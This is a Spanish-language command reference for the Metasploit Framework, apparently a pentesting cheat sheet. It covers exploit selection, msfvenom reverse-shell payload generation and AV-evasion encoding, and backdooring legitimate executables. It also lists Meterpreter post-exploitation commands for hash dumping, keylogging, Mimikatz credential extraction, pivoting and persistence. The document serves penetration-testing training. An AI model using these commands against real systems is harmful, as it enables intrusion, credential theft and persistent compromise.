Comandos Metasploit

Referencia interactiva de comandos Metasploit Framework

← Volver al inicio
Inicio y consola (msfconsole)
msfconsolePara qué sirve: Inicia la interfaz principal de Metasploit. El CLI interactivo donde se ejecutan todos los módulos.
-q sin banner · -x "cmd; cmd" ejecuta comandos al inicio
msfconsole -r <archivo.rc>Para qué sirve: Ejecuta un resource script (.rc) automáticamente al iniciar. Útil para automatizar flujos de trabajo repetitivos.
-r setup.rc carga y ejecuta el script
msfdb initPara qué sirve: Inicializa la base de datos PostgreSQL de Metasploit. Necesario para guardar hosts, servicios, vulnerabilidades y sesiones entre sesiones.
msfdb status verifica estado · msfdb reinit reinicia
db_statusPara qué sirve: Verifica si la conexión a la base de datos está activa dentro de msfconsole. Sin DB no se guardan los resultados de escaneos ni hosts.
[*] conectado · [-] desconectado
help / ?Para qué sirve: Muestra todos los comandos disponibles en msfconsole agrupados por categoría: Core, Database, Jobs, Modules, Sessions.
help <comando> ayuda específica de un comando
exit / quitPara qué sirve: Cierra msfconsole. Las sesiones de Meterpreter activas se mantienen en segundo plano si no se matan antes.
exit -y confirma · quit alias
Búsqueda de módulos (msfconsole)
search <término>Para qué sirve: Busca módulos por nombre, descripción, CVE, plataforma o tipo. Devuelve nombre, disclosure date, rank y nombre completo.
search eternalblue · search cve:2021
search type:exploit platform:windowsPara qué sirve: Filtra búsqueda por tipo de módulo y plataforma. Combinable con port:, rank:, date:, author:. Ideal para encontrar exploits específicos.
rank:great · port:445 · date:2020-2024
search type:auxiliaryPara qué sirve: Busca módulos auxiliares (escaneo, fuzzing, sniffing, admin). No explotan, pero sirven para reconocimiento y enumeración.
type:exploit · type:payload · type:post · type:encoder
search name:smbPara qué sirve: Busca módulos cuyo nombre contenga "smb". Útil cuando sabes el protocolo pero no el exploit exacto.
name:ssh · name:http · name:mysql
info <módulo>Para qué sirve: Muestra detalles completos de un módulo: descripción, autores, referencias, opciones requeridas, payloads compatibles y targets soportados.
info exploit/windows/smb/ms17_010_eternalblue
Gestión de workspaces (msfconsole)
workspacePara qué sirve: Lista todos los workspaces disponibles y marca el activo con un asterisco. Los workspaces separan proyectos/engagements en la base de datos.
* indica workspace actual
workspace -a <nombre>Para qué sirve: Crea un nuevo workspace y cambia a él automáticamente. Todo lo que se escanee o exploite se guarda en ese workspace.
workspace -a cliente_a crea y activa
workspace <nombre>Para qué sirve: Cambia al workspace especificado. Los datos del workspace anterior permanecen intactos y accesibles al volver.
workspace default vuelve al workspace por defecto
workspace -d <nombre>Para qué sirve: Elimina un workspace y todos sus datos de la base de datos (hosts, servicios, vulns, notas). Irreversible.
workspace -D elimina TODOS los workspaces
workspace -r <viejo> <nuevo>Para qué sirve: Renombra un workspace existente. Útil para corregir nombres o estandarizar nomenclatura entre engagements.
workspace -r temp production
Selección de exploits (msfconsole)
use <módulo>Para qué sirve: Carga un módulo en la consola activa. Cambia el prompt a msf6(exploit/ruta) o msf6( auxiliary/ruta). A partir de aquí se configuran opciones.
use exploit/windows/smb/ms17_010_eternalblue
use <número>Para qué sirve: Carga un módulo por su número de índice (del resultado de search). Más rápido que escribir la ruta completa.
search eternalblue → use 0
backPara qué sirve: Sale del módulo actual y vuelve al prompt principal msf6(). No cierra sesiones ni jobs activos. Útil para cambiar de módulo rápidamente.
back vuelve al inicio
show targetsPara qué sirve: Lista los sistemas operativos y versiones compatibles con el exploit cargado. Cada target tiene un ID numérico para seleccionar con set TARGET.
set TARGET 0 selecciona por ID
run / exploitPara qué sirve: Ejecuta el exploit con las opciones configuradas. "run" funciona en todos los módulos, "exploit" solo en tipo exploit. Abre sesión si tiene éxito.
exploit -j ejecuta como job en background
recheckPara qué sirve: Re-verifica si el target es vulnerable sin ejecutar el exploit completo. Útil después de cambiar opciones o cuando el primer check dio falso negativo.
check verifica vulnerabilidad
Configuración de opciones (msfconsole)
show optionsPara qué sirve: Muestra todas las opciones configurables del módulo activo: nombre, valor actual, requerido y descripción. Las marcadas como "yes" en Required deben configurarse.
Current Setting valor actual · Required obligatorio
set <OPCIÓN> <valor>Para qué sirve: Configura una opción del módulo activo. Persiste solo para la sesión actual del módulo. Opciones comunes: RHOSTS, RPORT, LHOST, LPORT, PAYLOAD.
set RHOSTS 192.168.1.100 · set LPORT 4444
setg <OPCIÓN> <valor>Para qué sirve: Configura una opción global que se aplica a TODOS los módulos. Ideal para LHOST, Proxies, UserAgent que se usan repetidamente.
setg LHOST 192.168.1.50 · setg Proxies socks5:127.0.0.1:9050
unset <OPCIÓN>Para qué sirve: Elimina el valor de una opción específica del módulo activo. Vuelve al valor por defecto o a vacío.
unset RHOSTS limpia el target
unsetg <OPCIÓN>Para qué sirve: Elimina una opción global. Necesario si setg configuró algo que interfiere con un módulo específico.
unsetg Proxies quita proxy global
set PAYLOAD <payload>Para qué sirve: Selecciona el payload que se ejecutará tras la explotación exitosa. Debe ser compatible con el exploit y el target.
set PAYLOAD windows/x64/meterpreter/reverse_tcp
Módulos auxiliares (msfconsole)
use auxiliary/scanner/portscan/tcpPara qué sirve: Escáner de puertos TCP integrado en Metasploit. Más lento que nmap pero los resultados se guardan automáticamente en la base de datos.
set RHOSTS 192.168.1.0/24 · set PORTS 1-1000
use auxiliary/scanner/http/dir_scannerPara qué sirve: Fuerza bruta de directorios web usando una wordlist integrada. Encuentra paths ocultos, paneles admin, backups.
set RHOSTS target · set THREADS 10
use auxiliary/scanner/smb/smb_loginPara qué sirve: Fuerza bruta de credenciales SMB. Prueba combinaciones user:pass contra el target. Útil para encontrar cuentas débiles en redes Windows.
set USER_FILE users.txt · set PASS_FILE pass.txt
use auxiliary/scanner/ssh/ssh_loginPara qué sirve: Fuerza bruta de credenciales SSH. Si encuentra credenciales válidas, abre una sesión de shell automáticamente.
set RHOSTS target · set STOP_ON_SUCCESS true
use auxiliary/scanner/snmp/snmp_loginPara qué sirve: Fuerza bruta de comunidades SNMP. Muchos dispositivos usan "public" o "private" como comunidad por defecto.
set RHOSTS target · set THREADS 20
use auxiliary/gather/*Para qué sirve: Categoría de módulos de recolección de información: enumeración de usuarios, extracción de hashes, fingerprinting de servicios.
search type:auxiliary category:gather
Tipos de payloads (msfconsole)
show payloadsPara qué sirve: Lista todos los payloads compatibles con el exploit actualmente cargado. Filtra automáticamente por plataforma y arquitectura.
show payloads solo los compatibles con el exploit activo
reverse_tcpPara qué sirve: El payload se conecta de vuelta al atacante (reverse shell). Requiere que el target pueda alcanzar tu IP:puerto. Funciona detrás de NAT si configuras port forwarding.
LHOST tu IP · LPORT puerto de escucha
bind_tcpPara qué sirve: El payload abre un puerto en el target y el atacante se conecta. No funciona si hay firewall en el target bloqueando puertos entrantes.
RHOST IP del target · RPORT puerto que abre el payload
meterpreterPara qué sirve: Payload avanzado de Metasploit. Proporciona shell interactivo con comandos propios: upload/download, keylogger, screenshot, pivoting, migrate. No escribe en disco (in-memory).
meterpreter/reverse_tcp · meterpreter/reverse_https
shellPara qué sirve: Payload básico que devuelve una shell del sistema (cmd.exe en Windows, /bin/sh en Linux). Menos funcional que Meterpreter pero más ligero y difícil de detectar.
shell/reverse_tcp · shell/bind_tcp
windows/x64/meterpreter/reverse_httpsPara qué sirve: Meterpreter sobre HTTPS. El tráfico se camufla como HTTPS normal, evadiendo IDS/IPS que inspeccionan puertos. Requiere LHOST y LPORT (443 recomendado).
set LPORT 443 · tráfico cifrado TLS
Generación de payloads (msfvenom)
msfvenom -p <payload> -f <formato> -o <archivo>Para qué sirve: Genera un payload standalone en el formato especificado. Se ejecuta fuera de msfconsole, pero la sesión se recibe en msfconsole con handler.
-p windows/x64/meterpreter/reverse_tcp · -f exe · -o payload.exe
msfvenom -p ... LHOST=x LPORT=x -f exe -o payload.exePara qué sirve: Genera un ejecutable Windows con Meterpreter reverse TCP. El target ejecuta el .exe y se conecta de vuelta al atacante.
LHOST=192.168.1.50 tu IP · LPORT=4444
msfvenom -p ... -e x86/shikata_ga_nai -i 5Para qué sirve: Aplica encoding para ofuscar el payload. Shikata Ga Nai es un encoder polimórfico que cambia la firma en cada iteración. No evade AV moderno por sí solo.
-i 5 5 iteraciones de encoding
msfvenom -l formatsPara qué sirve: Lista todos los formatos de output disponibles: exe, elf, asp, aspx, jsp, war, py, c, raw, dll, msi, vba, etc.
-f raw sin formato · -f c array C · -f python
msfvenom -l payloadsPara qué sirve: Lista TODOS los payloads disponibles en Metasploit. Filtrable con grep: msfvenom -l payloads | grep windows | grep x64
| grep linux · | grep meterpreter
msfvenom -p ... -x template.exe -k -f exe -o payload.exePara qué sirve: Inyecta el payload en un ejecutable legítimo (template.exe). El -k mantiene la funcionalidad original del binario. Útil para ingeniería social.
-x putty.exe binario legítimo · -k mantener funcionalidad
Staged vs Stageless payloads
reverse_tcp (staged)Para qué sirve: Envía primero un stager mínimo (~300 bytes) que descarga el payload completo (Meterpreter) desde el atacante. Más pequeño pero requiere conexión estable para la segunda etapa.
windows/x64/meterpreter/reverse_tcp · slash = staged
reverse_tcp (stageless)Para qué sirve: El payload completo va incluido en un solo binario. No necesita descargar nada extra. Más grande pero más confiable en redes inestables.
windows/x64/meterpreter_reverse_tcp · underscore = stageless
multi/handlerPara qué sirve: Módulo genérico para recibir conexiones de payloads generados con msfvenom. Configura el mismo payload, LHOST y LPORT que usaste en msfvenom y ejecuta.
use exploit/multi/handler · set PAYLOAD ... · run -j
Comandos básicos de Meterpreter
helpPara qué sirve: Muestra todos los comandos disponibles en la sesión de Meterpreter agrupados por categoría: File system, Networking, System, User interface, etc.
help <comando> ayuda específica
sysinfoPara qué sirve: Muestra información del sistema comprometido: nombre de máquina, OS, arquitectura, dominio y usuario actual. Primer comando a ejecutar tras obtener sesión.
Computer hostname · OS versión · Architecture
getuidPara qué sirve: Muestra el usuario bajo el cual corre la sesión de Meterpreter. Determina qué privilegios tienes y si necesitas escalar.
Server username usuario actual · NT AUTHORITY\SYSTEM máximo privilegio
getsystemPara qué sirve: Intenta escalar privilegios a SYSTEM (Windows) o root (Linux). Usa múltiples técnicas automáticamente: token impersonation, named pipe, service exploits.
getsystem -t 1 técnica específica · getsystem -v verbose
background / bgPara qué sirve: Envía la sesión de Meterpreter a segundo plano sin cerrarla. Vuelves al prompt de msfconsole. La sesión sigue activa y se puede recuperar con sessions -i.
background envía a bg · sessions -i 1 recupera sesión 1
shellPara qué sirve: Abre una shell interactiva del sistema operativo (cmd.exe en Windows, /bin/sh en Linux) dentro de la sesión de Meterpreter. Para volver a Meterpreter: exit.
shell abre shell · exit vuelve a meterpreter
Gestión de archivos (Meterpreter)
ls / pwd / cdPara qué sirve: Navegación básica del sistema de archivos del target. ls muestra archivos y permisos, pwd directorio actual, cd cambia de directorio.
ls -la detalles · cd C:\Users
upload <local> <remoto>Para qué sirve: Sube un archivo desde tu máquina al target. Útil para subir herramientas, exploits adicionales, wordlists o binarios de escalada.
upload /tmp/mimikatz.exe C:\Windows\Temp\
download <remoto> <local>Para qué sirve: Descarga archivos del target a tu máquina. Ideal para extraer bases de datos, documentos sensibles, hashes o archivos de configuración.
download C:\Windows\NTDS\ntds.dit /tmp/
search -f <patrón>Para qué sirve: Busca archivos en el target por nombre o patrón. Recursivo por defecto. Útil para encontrar archivos sensibles: passwords, configs, backups.
search -f *.txt · search -f password* · -d C:\ directorio
cat <archivo>Para qué sirve: Muestra el contenido de un archivo remoto sin descargarlo. Útil para leer configs, logs, archivos de texto rápidamente.
cat C:\Windows\System32\drivers\etc\hosts
rm / mkdir / editPara qué sirve: Eliminar archivos, crear directorios y editar archivos remotos. edit abre un editor interactivo en el archivo especificado.
rm archivo.txt · mkdir backup · edit config.ini
Comandos de sistema (Meterpreter)
psPara qué sirve: Lista todos los procesos en ejecución del target con PID, nombre, arquitectura, sesión y usuario. Necesario para identificar procesos donde migrarse.
PID identificador · Arch x86/x64 · User
migrate <PID>Para qué sirve: Mueve la sesión de Meterpreter a otro proceso. Útil para persistencia (migrarse a un servicio) o estabilidad (migrarse a un proceso que no se cierra).
migrate 1234 migra al PID 1234 · getpid tu PID actual
hashdumpPara qué sirve: Extrae los hashes NTLM de la SAM database de Windows. Requiere privilegios SYSTEM. Los hashes se pueden usar en ataques pass-the-hash o crackear con John/Hashcat.
Administrator:500:aad3b435b51404ee:...
keyscan_start / keyscan_dumpPara qué sirve: Inicia un keylogger en el target y vuelca las teclas capturadas. keyscan_stop detiene la captura. Requiere interacción del usuario.
keyscan_start inicia · keyscan_dump muestra teclas · keyscan_stop
screenshotPara qué sirve: Captura una imagen de la pantalla del target. Útil para ver qué está haciendo el usuario, capturar sesiones abiertas o interfaces web.
screenshot guarda como .jpeg · -v true verbose
run post/windows/manage/migratePara qué sirve: Módulo post que migra automáticamente a un proceso estable (explorer.exe, svchost.exe). Más inteligente que migrate manual porque elige el mejor proceso.
run post/... ejecuta módulo post
Comandos de red (Meterpreter)
ipconfig / ifconfigPara qué sirve: Muestra las interfaces de red del target: IPs, máscaras de subred, gateways. Esencial para identificar redes internas y planear pivoting.
ipconfig Windows · ifconfig Linux
portfwd add -l <local> -p <remoto> -r <target>Para qué sirve: Redirige un puerto del target a tu máquina local. Accede a servicios internos del target que no son accesibles desde fuera.
portfwd add -l 3389 -p 3389 -r 192.168.1.100 RDP
route add <subred> <máscara> <sesión>Para qué sirve: Añade una ruta a través de la sesión de Meterpreter. Permite que Metasploit alcance redes internas del target (pivoting).
route add 192.168.2.0 255.255.255.0 1 sesión 1
autoroute -s <subred>Para qué sirve: Versión simplificada de route. Añade automáticamente las rutas de las interfaces del target. Más fácil de usar que route add manual.
run post/multi/manage/autoroute · -s 192.168.1.0/24
run get_local_subnetsPara qué sirve: Muestra las subredes locales accesibles desde el target. Útil para descubrir qué redes puedes alcanzar después de hacer pivoting.
run post/multi/manage/autoroute primero
arp / netstatPara qué sirve: Muestra la tabla ARP y conexiones de red activas del target. Útil para descubrir hosts en la red local y conexiones establecidas.
arp -a tabla ARP · netstat -an conexiones
Base de datos y escaneo (msfconsole)
db_nmap <opciones> <target>Para qué sirve: Ejecuta nmap desde msfconsole y guarda automáticamente los resultados en la base de datos. Los hosts, puertos y servicios quedan disponibles con hosts y services.
db_nmap -sV -O 192.168.1.0/24
hostsPara qué sirve: Lista todos los hosts descubiertos en la base de datos del workspace actual. Muestra IP, MAC, nombre, OS y última actualización.
hosts -c address,os,name columnas específicas · hosts -d eliminar
servicesPara qué sirve: Lista todos los servicios descubiertos por escaneos. Muestra puerto, protocolo, nombre del servicio y estado. Filtrable por puerto o nombre.
services -p 445 solo SMB · services -u solo abiertos
vulnsPara qué sirve: Lista todas las vulnerabilidades registradas en la base de datos. Se populan automáticamente al ejecutar módulos auxiliares de detección o exploits exitosos.
vulns todas · vulns -p <host> por host
notesPara qué sirve: Muestra notas almacenadas en la base de datos: credenciales encontradas, hashes, información de enumeración. Los módulos auxiliares guardan notas automáticamente.
notes -t por tipo · notes -a añadir nota manual
credsPara qué sirve: Lista todas las credenciales capturadas: passwords en claro, hashes NTLM, credenciales de servicios. Se populan con módulos de login y post-explotación.
creds todas · creds -p smb solo SMB
Evasión y ofuscación
show encodersPara qué sirve: Lista todos los encoders disponibles. Los encoders transforman el payload para cambiar su firma. Shikata Ga Nai es el más conocido pero no evade AV moderno.
x86/shikata_ga_nai polimórfico · x64/xor XOR simple
set EnableStageEncoding truePara qué sirve: Habilita encoding automático del stager en payloads staged. Codifica la primera etapa del payload para evadir detección por firma estática.
set StageEncoder x64/xor encoder específico
set EXITFUNC threadPara qué sirve: Controla cómo el payload sale tras ejecutarse. "thread" es el más seguro — el proceso host sigue corriendo. "process" mata el proceso. "seh" usa structured exception handling.
EXITFUNC=thread default · process · seh
msfvenom -a x64 --platform windows -p ... -e x64/xor -i 3Para qué sirve: Genera payload con encoding XOR para x64. Especificar arquitectura (-a) y plataforma (--platform) evita errores de compatibilidad.
-a x64 arquitectura · --platform windows
set DisablePayloadHandler truePara qué sirve: Deshabilita el handler automático de payload. Útil cuando ya tienes un multi/handler corriendo y no quieres que se abra otro al ejecutar un exploit.
set DisablePayloadHandler true · evita conflictos de puerto
Módulos post-explotación
run post/windows/gather/checkvmPara qué sirve: Detecta si el target es una máquina virtual. Útil para decidir si estás en un sandbox o entorno de análisis antes de ejecutar payloads más agresivos.
run post/... ejecuta sobre la sesión activa
run post/windows/gather/enum_logged_on_usersPara qué sirve: Enumera usuarios que han iniciado sesión en el target (local y remoto). Útil para identificar administradores y cuentas activas.
run post/... sobre sesión activa
run post/multi/recon/local_exploit_suggesterPara qué sirve: Analiza el target y sugiere exploits locales para escalada de privilegios basados en el OS, parches y configuración.
run post/... sobre sesión activa · muestra exploits potenciales
run post/windows/manage/enable_rdpPara qué sirve: Habilita Remote Desktop Protocol en el target. Abre el puerto 3389 y configura el firewall. Útil para acceso persistente GUI.
run post/... · run post/windows/manage/enable_rdp FORWARD=true
load kiwi / load mimikatzPara qué sirve: Carga el módulo Kiwi (fork de Mimikatz) dentro de Meterpreter. Extrae passwords en claro, hashes, tickets Kerberos y credenciales de la memoria.
load kiwi · creds_all extrae todo · kerberos_ticket_list
run post/windows/manage/persistence_exePara qué sirve: Instala persistencia en el target ejecutando un binario en cada inicio. Crea un servicio o entrada en el registro para mantener acceso tras reinicios.
set REXE /path/to/backdoor.exe · set STARTUP USER
